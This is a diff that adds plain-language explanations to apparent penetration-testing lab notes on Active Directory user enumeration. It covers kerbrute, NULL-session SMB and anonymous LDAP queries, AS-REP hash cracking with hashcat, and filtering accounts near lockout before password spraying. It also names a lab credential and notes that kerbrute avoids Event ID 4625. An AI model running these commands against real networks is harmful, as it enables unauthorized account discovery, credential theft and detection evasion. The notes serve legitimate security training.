@@ -26,6 +26,7 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o vali
 # Hash dumped: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
 # Crack: hashcat -m 18200 mmorgan.hash /usr/share/wordlists/rockyou.txt
 ```
+> `kerbrute userenum` tests each line of the wordlist against Kerberos to confirm which usernames are real. `-o` saves the confirmed list. Kerbrute also automatically flags AS-REP roastable accounts and dumps their hashes for you.
 
 ---
 
@@ -42,6 +43,7 @@ rpcclient -U "" -N 172.16.5.5
 # nxc (no creds)
 nxc smb 172.16.5.5 --users
 ```
+> A NULL session connects to SMB without credentials. `enum4linux -U` lists users. The `cut` commands strip the brackets from the output to get a clean username list. `rpcclient enumdomusers` returns usernames and their relative identifiers (RIDs). `nxc --users` without credentials tries the same NULL session approach.
 
 ---
 
@@ -55,6 +57,7 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 # -u "" = anonymous | -U = users only
 ```
+> `ldapsearch` queries the DC's LDAP (Lightweight Directory Access Protocol) directly. The filter `(objectclass=user)` returns all user objects. `grep sAMAccountName` then `cut` extracts just the username. `windapsearch -u ""` is an anonymous bind; `-U` limits results to user accounts.
 
 ---
 
@@ -63,6 +66,7 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 ```bash
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
 ```
+> Tests each username from the wordlist against Kerberos. Valid usernames get a different response than invalid ones. No credentials needed. Saves confirmed valid users to the output file.
 
 **Why kerbrute enumeration is stealthy:** Uses Kerberos pre-auth — does NOT generate Event ID 4625. Only generates 4768 if Kerberos audit is enabled.
 
@@ -84,6 +88,7 @@ nxc smb 172.16.5.5 -u wley -p 'transporter@4' --users
 # Filter out accounts near lockout threshold (threshold=5, skip 3+)
 nxc smb 172.16.5.5 -u wley -p 'transporter@4' --users | grep -v "badpwdcount: [3-9]"
 ```
+> `--users` returns all domain users along with their bad password count (`badpwdcount`). The second command filters out any account already at 3 or more failed attempts when your threshold is 5. This prevents you from accidentally locking accounts.
 
 **`badpwdcount` is critical** — skip any account at 3+ when threshold is 5.
 
